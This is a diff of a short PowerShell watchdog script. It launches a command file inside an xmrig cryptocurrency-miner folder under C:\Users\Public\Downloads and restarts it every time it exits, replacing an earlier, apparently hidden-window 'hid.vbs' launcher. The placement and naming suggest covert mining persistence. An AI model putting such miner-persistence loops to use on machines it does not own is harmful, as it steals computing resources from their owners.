@@ -1,18 +1,18 @@
-$hidVbsPath = "C:\Users\Public\Downloads\xmrig-6.22.2\hid.vbs"
+$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
 
-function Start-HidVbs {
-  $global:hidVbsProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$hidVbsPath`"" -PassThru  # Removed -NoNewWindow
-  Write-Host "hid.vbs START"
+function Start-CoinRun {
+  $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru  # Removed -NoNewWindow
+  Write-Host "coinrun.cmd START"
 }
 
-Start-HidVbs # Start the process initially
+Start-CoinRun # Start the process initially
 
 while ($true) {
-  if ($global:hidVbsProcess.HasExited) {
-    Write-Warning "hid.vbs STOP. Reboot..."
-    Start-HidVbs # Restart the process
+  if ($global:coinRunProcess.HasExited) {
+    Write-Warning "coinrun.cmd STOP. Reboot..."
+    Start-CoinRun # Restart the process
   } else {
-    Write-Host "hid.vbs running..."
+    Write-Host "coinrun.cmd running..."
   }
 
   Start-Sleep -Seconds 10
